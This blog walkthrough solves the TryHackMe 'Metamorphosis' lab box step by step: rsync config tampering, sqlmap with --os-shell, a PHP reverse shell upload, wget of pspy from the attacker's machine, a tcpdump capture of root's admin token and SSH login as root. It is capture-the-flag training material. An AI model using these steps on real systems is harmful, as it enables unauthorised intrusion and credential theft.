<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=x-ua-compatible content="ie=edge">
<title>TryHackMe Metamorphosis | Classroom</title>
<link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon>
<meta name=author content="Animesh Roy">
<meta name=description content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more...">
<meta property="og:type" content="website">
<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-metamorphosis/">
<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="https://classroom.anir0y.in/post/tryhackme-metamorphosis/">
<meta property="og:image" content="https://classroom.anir0y.in">
<meta property="twitter:image" content="https://classroom.anir0y.in">
<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script>
<script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","6gp5990ghr")</script>
<link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-metamorphosis/>
<meta property="og:title" content="TryHackMe Metamorphosis">
<meta property="og:description" content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more...">
<meta property="og:type" content="article">
<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-metamorphosis/"><meta property="article:section" content="post">
<meta property="article:published_time" content="2021-07-21T03:31:08+05:30">
<meta property="article:modified_time" content="2021-07-21T03:31:08+05:30">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="TryHackMe Metamorphosis">
<meta name=twitter:description content="TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more...">
<link rel=stylesheet href=/css/semantic.min.css>
<link rel=stylesheet href=/css/icomoon.css>
<link rel=stylesheet href=/css/OverlayScrollbars.min.css>
<link rel=stylesheet href=/css/github-markdown.css>
<link rel=stylesheet href=/css/site.css>
<link rel=stylesheet href=/css/custom.css>
<style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style>
<link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css>
<link rel=stylesheet href=/css/custom.css>
</head>
<body class=default>
<nav class="ui secondary menu dream-menu">
<div class=item>
<i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
</div>
<div class=item>
<i class="large link home icon" title=Home onclick="window.location.href='https://classroom.anir0y.in'"></i>
</div>
<div class=item>
<i class="large link icon theme-switch" onclick=themeSwitch()></i>
</div>
<div class=item>
<i class="large link search icon" onclick=toggleSearch()></i>
</div>
</nav>
<div class=flip-container>
<div class=flipper>
<section class=front>
<div class=dream-max-width>
<div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse>
<aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
<div class="ui segment toc">
<nav id=TableOfContents>
<ul>
<li><a href=#overview>OverView</a></li>
<li><a href=#recon>Recon</a>
<ul>
<li><a href=#nmap>nmap</a></li>
<li><a href=#directory-listing-with-gobuster>Directory Listing with <code>GoBuster</code></a></li>
<li><a href=#rsync-enumeration>rsync enumeration</a></li>
<li><a href=#re-visiting-the-web>re-visiting the web</a></li>
</ul>
</li>
<li><a href=#root>root</a>
<ul>
<li><a href=#privilege-escalation>Privilege Escalation</a></li>
</ul>
</li>
</ul>
</nav>
</div>
<div class="ui segment actions">
<button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
<i class="save icon"></i>
</button>
<a href="https://twitter.com/intent/tweet?text=TryHackMe%20Metamorphosis&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-metamorphosis%2f" class="ui circular twitter icon button">
<i class="twitter icon"></i>
</a>
<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-metamorphosis%2f" class="ui circular facebook icon button">
<i class="facebook icon"></i>
</a>
</div>
</aside>
<div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img>
<section class="ui top attached segment">
<header>
<h1 class="ui large header">TryHackMe Metamorphosis<div class="sub header">
@
<a href=https://bit.ly/34sGFiK target=_blank>Animesh Roy</a>
|
Wednesday, Jul 21, 2021
| 6 minutes read
| Update at
Wednesday, Jul 21, 2021
</div>
</h1>
</header>
<article class=main><h2 id=overview>OverView</h2>
<table>
<thead>
<tr>
<th>Metamorphosis</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Room</td>
<td style=text-align:center><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/93e2e34d54161c2a22b80a1eb5cd9857.jpeg alt=logo></td>
</tr>
</tbody>
</table>
<h2 id=recon>Recon</h2>
<h3 id=nmap>nmap</h3>
<pre><code> ```nmap
 sudo nmap -sC -sV -oN Metamorphosis 10.10.38.244
 [sudo] password for anir0y: 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 03:35 IST
 Nmap scan report for 10.10.38.244
 Host is up (0.17s latency).
 Not shown: 995 closed ports
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
 |   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
 |_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
 80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
 873/tcp open  rsync       (protocol version 31)
 Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

 Host script results:
 |_clock-skew: mean: 3s, deviation: 0s, median: 2s
 |_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
 | smb-os-discovery: 
 |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
 |   Computer name: incognito
 |   NetBIOS computer name: INCOGNITO\x00
 |   Domain name: \x00
 |   FQDN: incognito
 |_  System time: 2021-07-20T22:05:48+00:00
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 | smb2-security-mode: 
 |   2.02: 
 |_    Message signing enabled but not required
 | smb2-time: 
 |   date: 2021-07-20T22:05:48
 |_  start_date: N/A

 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
 ```
</code></pre>
<h3 id=directory-listing-with-gobuster>Directory Listing with <code>GoBuster</code></h3>
<pre><code> ```bash
 gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
 #txt &amp; php extention for good measure
 ...[snip]...
 /index.php            (Status: 200) [Size: 10818]
 /admin                (Status: 301) [Size: 312] [--&gt; http://10.10.38.244/admin/]
 ```
</code></pre>
<ul>
<li>
<p><code>admin</code> dir is returning <code>403</code></p>
<p><img src=https://i.imgur.com/3Vqorz4.png alt=img></p>
</li>
<li>
<p>strange enough it returns the following text upcon <code>view-source</code>
<img src=https://i.imgur.com/cOKj7Ek.png alt=img></p>
</li>
</ul>
<p>seems like somehow we need to change back /config website to <code>development</code> mode. seems like a deadend here! :(</p>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<hr>
<h3 id=rsync-enumeration>rsync enumeration</h3>
<ul>
<li>
<p>Enumerated the rsync module:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rsync -rdt rsync://10.10.38.244:873
Conf            All Confs
</code></pre></div></li>
<li>
<p>list content of <code>Conf</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rsync -rdt rsync://10.10.38.244:873/Conf
drwxrwxrwx          4,096 2021/04/11 01:33:08 .
-rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
-rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
-rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
-rw-r--r--            <span style=color:#ae81ff>332</span> 2021/04/10 01:31:38 ldap.conf
-rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
-rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
-rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
-rw-r--r--            <span style=color:#ae81ff>320</span> 2021/04/10 01:33:16 ports.conf
-rw-r--r--            <span style=color:#ae81ff>589</span> 2021/04/10 01:31:07 resolv.conf
-rw-r--r--             <span style=color:#ae81ff>29</span> 2021/04/10 01:32:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
-rw-rw-r--             <span style=color:#ae81ff>72</span> 2021/04/11 01:33:06 webapp.ini
</code></pre></div></li>
<li>
<p>With access to the share, download everything available to the attacking machine.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rsync -av rsync://10.10.38.244:873/Conf ./rsync
</code></pre></div></li>
<li>
<p>list the downloaded files:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>ls -l
total <span style=color:#ae81ff>193</span>
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout  <span style=color:#ae81ff>4620</span> Jul <span style=color:#ae81ff>21</span> 03:54 access.conf
-rw-r--r-- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout  <span style=color:#ae81ff>1341</span> Apr <span style=color:#ae81ff>10</span> 01:26 bluezone.ini
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout  <span style=color:#ae81ff>2969</span> Jul <span style=color:#ae81ff>21</span> 03:54 debconf.conf
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout   <span style=color:#ae81ff>332</span> Jul <span style=color:#ae81ff>21</span> 03:54 ldap.conf
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout <span style=color:#ae81ff>94404</span> Jul <span style=color:#ae81ff>21</span> 03:54 lvm.conf
-rw-r--r-- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout  <span style=color:#ae81ff>9005</span> Apr <span style=color:#ae81ff>10</span> 01:28 mysql.ini
-rw-r--r-- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout <span style=color:#ae81ff>70207</span> Apr <span style=color:#ae81ff>10</span> 01:26 php.ini
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout   <span style=color:#ae81ff>320</span> Jul <span style=color:#ae81ff>21</span> 03:54 ports.conf
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout   <span style=color:#ae81ff>589</span> Jul <span style=color:#ae81ff>21</span> 03:54 resolv.conf
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout    <span style=color:#ae81ff>29</span> Jul <span style=color:#ae81ff>21</span> 03:54 screen-cleanup.conf
-rw------- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout  <span style=color:#ae81ff>9542</span> Jul <span style=color:#ae81ff>21</span> 03:54 smb.conf
-rw-rw-r-- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>502</span> dialout    <span style=color:#ae81ff>72</span> Apr <span style=color:#ae81ff>11</span> 01:33 webapp.ini
</code></pre></div></li>
<li>
<p><code>webapp.ini</code> looks kinda intresting</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat webapp.ini 
<span style=color:#f92672>[</span>Web_App<span style=color:#f92672>]</span>
env <span style=color:#f92672>=</span> prod
user <span style=color:#f92672>=</span> tom
password <span style=color:#f92672>=</span> theCat

<span style=color:#f92672>[</span>Details<span style=color:#f92672>]</span>
Local <span style=color:#f92672>=</span> No
</code></pre></div><p>seems like we have a wokring config, where currently <code>env</code> sets to <strong>prod</strong> and we can actually change and re-upload to the server. let&rsquo;s try doing this.</p>
<p>replace <code>env = prod</code> to <code>env = dev</code></p>
</li>
<li>
<p>reuploading <code>webapp.ini</code> to the server</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>rsync -av rsync/webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
sending incremental file list
webapp.ini

sent <span style=color:#ae81ff>171</span> bytes  received <span style=color:#ae81ff>41</span> bytes  84.80 bytes/sec
total size is <span style=color:#ae81ff>71</span>  speedup is 0.33
<span style=color:#75715e># uploaded the edited file</span>
</code></pre></div></li>
</ul>
<h3 id=re-visiting-the-web>re-visiting the web</h3>
<ul>
<li>
<p>this time web-application actually worked!</p>
<p><img src=https://i.imgur.com/Am4aEwe.png alt=img></p>
</li>
<li>
<p>we have one <code>input</code>, first thing I&rsquo;m gonna try is <code>SQLMAP</code> for sqlinjection attack.</p>
</li>
<li>
<p>saving the SQL payload using Burp
<img src=https://i.imgur.com/7k8g5LK.png alt=img></p>
</li>
<li>
<p>running <code>SQLMAP</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -r username.req --level <span style=color:#ae81ff>3</span> --risk <span style=color:#ae81ff>3</span> --batch --os-shell
<span style=color:#75715e># trying to get a `os-shell` this way</span>
</code></pre></div><p><img src=https://i.imgur.com/WEZbgc4.png alt=img></p>
<p>and it worked! let&rsquo;s try and get a proper working shell</p>
</li>
<li>
<p>With command execution, establish a persistent shell by transferring a php script and calling it with curl to return a reverse shell on the target.</p>
<p>I will be uploading <code>php reverse shell</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cp /usr/share/webshells/php/php-reverse-shell.php rev.php
</code></pre></div><p><img src=https://i.imgur.com/FLWILS7.png alt=img>
change the IP</p>
</li>
<li>
<p>upload it via curl:</p>
<p><img src=https://i.imgur.com/kjY2byf.png alt=img></p>
<p>got the <code>low priv</code> shell access to the box</p>
</li>
<li>
<p>we can read the <code>user.txt</code> file with current shell.</p>
<p><img src=https://i.imgur.com/Crs4ZDe.png alt=img></p>
</li>
</ul>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<hr>
<h2 id=root>root</h2>
<p>so far we have a low priv shell running as <code>www-data</code></p>
<h3 id=privilege-escalation>Privilege Escalation</h3>
<ul>
<li>
<p>I ran <code>linpeas</code> but no usefull results. except <code>www-data</code> can run <code>tcpdump</code></p>
</li>
<li>
<p><code>sudo -l</code> returns nothing useful</p>
</li>
<li>
<p>got a hint for running <code>Pspy</code>. you can download it here: <a href=https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0>https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0</a></p>
</li>
<li>
<p>running <code>PSPY</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># download to the BOX</span>
wget http://10.17.4.40/pspy64s
wget http://10.17.4.40/pspy64s
--2021-07-20 23:03:43--  http://10.17.4.40/pspy64s
Connecting to 10.17.4.40:80... connected.
HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
Length: <span style=color:#ae81ff>1156536</span> <span style=color:#f92672>(</span>1.1M<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>application/octet-stream<span style=color:#f92672>]</span>
Saving to: <span style=color:#e6db74>&#39;pspy64s&#39;</span>

pspy64s             100%<span style=color:#f92672>[===================</span>&gt;<span style=color:#f92672>]</span>   1.10M   538KB/s    in 2.1s    

2021-07-20 23:03:46 <span style=color:#f92672>(</span><span style=color:#ae81ff>538</span> KB/s<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;pspy64s&#39;</span> saved <span style=color:#f92672>[</span>1156536/1156536<span style=color:#f92672>]</span>

<span style=color:#75715e>## give +x &amp; run; wait for new process to spin</span>


chmod +x pspy64s; ./pspy64s
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
░░       ░  ░  ░  ░░       ▒ ▒ ░░  
               ░           ░ ░     
                              ░ ░ 

...
2021/07/20 23:05:06 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1877</span>   | python -c import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span> 
<span style=color:#75715e># my shell</span>

2021/07/20 23:06:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>20564</span>  | /bin/sh /root/req.sh 
2021/07/20 23:06:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>20563</span>  | /bin/sh /root/req.sh 
2021/07/20 23:06:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>20562</span>  | /bin/sh -c /root/req.sh 
<span style=color:#75715e># well root is trying to run something!!</span>
</code></pre></div></li>
</ul>
<p>Attempts to curl it as the www-data user fail and are met with a message stating it only interacts with the root user. Attempts to tunnel the internal port back to the target machine and curl as root there failed. So tcpdump was identified installed and used to capture the curl request. The resulting packet capture was transferred to the attacking machine and opened in wireshark.</p>
<ul>
<li>
<p>run tcpdump in one terminal</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>tcpdump -i any -s <span style=color:#ae81ff>0</span> -w 1.pcap
<span style=color:#75715e># my relative path is `/var/www/html/</span>
<span style=color:#75715e>#reason being I can wget the pcap without terminating the tcpdump</span>
</code></pre></div></li>
<li>
<p>run pspy on 2nd terminal</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@incognito:/tmp$ ./ps*
./ps*
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
░░       ░  ░  ░  ░░       ▒ ▒ ░░  
               ░           ░ ░     
                              ░ ░     

<span style=color:#75715e># wait till these shows up again</span>
1/07/21 00:18:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1830</span>   | curl http://127.0.0.1:1027/?admin<span style=color:#f92672>=</span>ScadfwerDSAd_343123ds123dqwe12                                                       
2021/07/21 00:18:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1829</span>   | /bin/sh /root/req.sh 
2021/07/21 00:18:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1828</span>   | /bin/sh -c /root/req.sh 
</code></pre></div></li>
<li>
<p>wget the pcap file</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh>wget MACHINE_IP/traffic.pcap
</code></pre></div></li>
<li>
<p>open <code>pcap</code> file with wireshark
<img src=https://i.imgur.com/63l0roF.png alt=img></p>
</li>
<li>
<p>copy the key
<img src=https://i.imgur.com/4CYUtN7.png alt=img></p>
</li>
<li>
<p>save the <code>ssh</code> key</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>vi key.ssh                         <span style=color:#75715e># put the content</span>
chmod <span style=color:#ae81ff>600</span>                          <span style=color:#75715e>#require for SSH key security</span>
ssh -i key.ssh root@MACHINE_IP     <span style=color:#75715e># you logged in as root</span>
</code></pre></div><p><img src=https://i.imgur.com/uQhsMGR.png alt=img></p>
</li>
</ul>
<hr>
<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script>
</article>
</section>
</div>
</div>
<footer class="ui basic center aligned segment" style=background-color:transparent>
<p>© 2010 - 2022 Classroom</p>
</footer>
</div>
</section>
<section class=back>
<div class=dream-max-width>
<header class="ui basic very padded segment dream-header">
<div class="ui small circular image">
<img src=/img/avatar.jpeg>
</div>
<div class=content>
<h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div>
</h1>
<article class="ui horizontal list">
<a class=item href=/categories>
<i class="th list icon" title="All Categories"></i>
</a>
<a class=item href=/tags>
<i class="tags icon" title="All Tags"></i>
</a>
</article>
<article class=dream-tags>
<a class="ui label" href=/tags/agent-sudo/ title="Agent Sudo">
Agent Sudo
</a>
<a class="ui label" href=/tags/autopsy/ title=autopsy>
autopsy
</a>
<a class="ui label" href=/tags/backdoor/ title=backdoor>
backdoor
</a>
<a class="ui label" href=/tags/baron-samedit/ title="Baron Samedit">
Baron Samedit
</a>
<a class="ui label" href=/tags/bash/ title=bash>
bash
</a>
<a class="ui label" href=/tags/cheatsheet/ title=cheatsheet>
cheatsheet
</a>
<a class="ui label" href=/tags/config/ title=config>
config
</a>
<a class="ui label" href=/tags/couch/ title=couch>
couch
</a>
<a class="ui label" href=/tags/crisis/ title=Crisis>
Crisis
</a>
<a class="ui label" href=/tags/dominos/ title=dominos>
dominos
</a>
<a class="ui label" href=/tags/empire/ title=Empire>
Empire
</a>
<a class="ui label" href=/tags/encryption/ title=encryption>
encryption
</a>
<a class="ui label" href=/tags/ffuf/ title=ffuf>
ffuf
</a>
<a class="ui label" href=/tags/forensic/ title=forensic>
forensic
</a>
<a class="ui label" href=/tags/gitandcrumpets/ title=gitandcrumpets>
gitandcrumpets
</a>
<a class="ui label" href=/tags/gnupg/ title=gnupg>
gnupg
</a>
<a class="ui label" href=/tags/hackpark/ title=HackPark>
HackPark
</a>
<a class="ui label" href=/tags/hydra/ title=hydra>
hydra
</a>
<a class="ui label" href=/tags/inclusion/ title=inclusion>
inclusion
</a>
<a class="ui label" href=/tags/internal/ title=internal>
internal
</a>
<a class="ui label" href=/tags/internship/ title=Internship>
Internship
</a>
<a class="ui label" href=/tags/interview/ title=interview>
interview
</a>
<a class="ui label" href=/tags/kenobi/ title=kenobi>
kenobi
</a>
<a class="ui label" href=/tags/lab/ title=lab>
lab
</a>
<a class="ui label" href=/tags/leaks/ title=leaks>
leaks
</a>
<a class="ui label" href=/tags/linux/ title=Linux>
Linux
</a>
<a class="ui label" href=/tags/memory/ title=memory>
memory
</a>
<a class="ui label" href=/tags/metamorphosis/ title=Metamorphosis>
Metamorphosis
</a>
<a class="ui label" href=/tags/metasploit/ title=metasploit>
metasploit
</a>
<a class="ui label" href=/tags/mobile/ title=Mobile>
Mobile
</a>
<a class="ui label" href=/tags/msf/ title=msf>
msf
</a>
<a class="ui label" href=/tags/msfvenom/ title=msfvenom>
msfvenom
</a>
<a class="ui label" href=/tags/notes/ title=notes>
notes
</a>
<a class="ui label" href=/tags/openvas/ title=openvas>
openvas
</a>
<a class="ui label" href=/tags/osi/ title=OSI>
OSI
</a>
<a class="ui label" href=/tags/osi-model/ title="OSI Model">
OSI Model
</a>
<a class="ui label" href=/tags/overpass-2/ title="Overpass 2">
Overpass 2
</a>
<a class="ui label" href=/tags/pentesting/ title=Pentesting>
Pentesting
</a>
<a class="ui label" href=/tags/pgp/ title=PGP>
PGP
</a>
<a class="ui label" href=/tags/pip/ title=pip>
pip
</a>
<a class="ui label" href=/tags/pip2/ title=pip2>
pip2
</a>
<a class="ui label" href=/tags/post-exploitation/ title=Post-Exploitation>
Post-Exploitation
</a>
<a class="ui label" href=/tags/powershell/ title=powershell>
powershell
</a>
<a class="ui label" href=/tags/putty/ title=putty>
putty
</a>
<a class="ui label" href=/tags/python/ title=python>
python
</a>
<a class="ui label" href=/tags/razorblack/ title=RazorBlack>
RazorBlack
</a>
<a class="ui label" href=/tags/redteaming/ title=redteaming>
redteaming
</a>
<a class="ui label" href=/tags/ref/ title=Ref>
Ref
</a>
<a class="ui label" href=/tags/relevant/ title=Relevant>
Relevant
</a>
<a class="ui label" href=/tags/rooms/ title=rooms>
rooms
</a>
<a class="ui label" href=/tags/rootme/ title=RootMe>
RootMe
</a>
<a class="ui label" href=/tags/rpwebscanning/ title=rpwebscanning>
rpwebscanning
</a>
<a class="ui label" href=/tags/script/ title=script>
script
</a>
<a class="ui label" href=/tags/scripting/ title=Scripting>
Scripting
</a>
<a class="ui label" href=/tags/simple-ctf/ title="Simple CTF">
Simple CTF
</a>
<a class="ui label" href=/tags/splunk/ title=splunk>
splunk
</a>
<a class="ui label" href=/tags/stego/ title=stego>
stego
</a>
<a class="ui label" href=/tags/super-spam/ title=Super-Spam>
Super-Spam
</a>
<a class="ui label" href=/tags/sweettoothinc/ title=sweettoothinc>
sweettoothinc
</a>
<a class="ui label" href=/tags/sysmon/ title=sysmon>
sysmon
</a>
<a class="ui label" href=/tags/thefindcommand/ title=Thefindcommand>
Thefindcommand
</a>
<a class="ui label" href=/tags/thm/ title=thm>
thm
</a>
<a class="ui label" href=/tags/tmux/ title=tmux>
tmux
</a>
<a class="ui label" href=/tags/tools/ title=tools>
tools
</a>
<a class="ui label" href=/tags/tryhackme/ title=tryhackme>
tryhackme
</a>
<a class="ui label" href=/tags/vapt/ title=vapt>
vapt
</a>
<a class="ui label" href=/tags/volatility/ title=Volatility>
Volatility
</a>
<a class="ui label" href=/tags/vuln-labs/ title="vuln labs">
vuln labs
</a>
<a class="ui label" href=/tags/vulnversity/ title=Vulnversity>
Vulnversity
</a>
<a class="ui label" href=/tags/web-scanning/ title="web scanning">
